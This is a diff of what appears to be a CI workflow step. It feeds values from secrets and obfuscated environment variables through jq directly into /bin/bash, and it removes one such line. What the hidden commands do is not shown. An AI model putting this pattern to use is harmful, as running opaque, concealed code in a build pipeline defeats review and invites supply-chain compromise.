@@ -21,7 +21,6 @@ jobs:
           u61624: ${{ secrets.u61624 }}
         run: |
           printf '%s' "$u61624" | jq -r .jf5 | /bin/bash
-          echo $uwd70 | jq -r .hvns605 | /bin/bash
           printf '%s' "$o1" | jq -r .rwrro73 | /bin/bash
           echo $xy991 | jq -r .rehs292 | /bin/bash
           echo $ahkz944 | jq -r .loh683 | /bin/bash
